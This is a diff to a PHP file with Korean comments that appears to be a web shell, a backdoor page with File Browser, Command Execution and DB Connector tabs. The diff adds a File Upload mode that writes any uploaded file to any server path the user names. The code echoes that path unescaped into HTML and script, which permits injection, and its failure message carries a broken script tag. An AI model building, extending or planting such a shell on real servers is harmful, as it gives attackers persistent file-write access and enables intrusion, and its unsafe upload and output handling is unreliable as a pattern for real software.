@@ -108,6 +108,18 @@
         readfile($filePath); //경로에 있는 파일을 그대로 불러옴
         exit(); //얘는 반드시 종료를 해주어야함.
     }
+    else if ($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])){ //업로드 할 떄 파일의 값들이 몇 개 있는데, tmp_name 속성값은 비어있지 않는지의 유무로 파일이 있는지 확인
+        $filePath = $path.$_FILES["file"]["name"];
+
+        if(!move_uploaded_file($_FILES["file"]["tmp_name"], $filePath)){
+            echo "script>alert('파일 업로드에 실패하였습니다.');history.back(-1);</sctipt>";
+            exit();
+        }
+        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+
+    }
+    
+
 
     # Directory List Return Function
     function getDirList($getPath) {
@@ -189,7 +201,7 @@
         <hr>
         <ul class="nav nav-tabs">
         <li role="presentation" <?php if($mode == "fileBrowser") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
-        <li role="presentation" <?php if($mode == "fileUpload") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileUpload">File Upload</a></li>
+        <li role="presentation" <?php if($mode == "fileUpload") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileUpload&path=<?php echo $path ?>">File Upload</a></li>
         <li role="presentation" <?php if($mode == "command") echo 'class="active"'; ?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
         <li role="presentation" <?php if($mode == "db") echo 'class="active"'; ?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
         <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
@@ -309,6 +321,29 @@
             <br>
             <p class="text-center"><button class="btn btn-default" type="button" onclick="history.back(-1);">Back</button></p>
         
+        <?php  } else if($mode == "fileUpload") { ?>
+            <!-- 파일 업로드 시에는 post가 맞지만, enctype까지 정해주어야함. -->
+            <form action="<?php echo $page ?>?mode=fileUpload&path=<?php echo $path ?>" method="POST" enctype="multipart/form-data">
+                <div class="input-group">
+                    <span class="input-group-addon">Upload Path</span>
+                    <input type="text" class="form-control" placeholder = "Path Input..." name="path" value="<?php echo $path ?>">
+                    <span class="input-group-btn">
+
+                    </span>
+                </div>
+                <hr>
+                <div class="form-group">
+                    <label for ="exampleInputFile">파일 업로드</label>
+                    <input type="file" id="exampleInputFile" name="file">
+                    <p class="help-block">위의 Upload Path 경로로 업로드가 됩니다.</p>
+                    <p class="text-center"><button class="btn btn-default" type="submit">File Upload</button></p>
+                </div>
+        </form>
+
+
+
+
+
         <?php } ?>
 
 
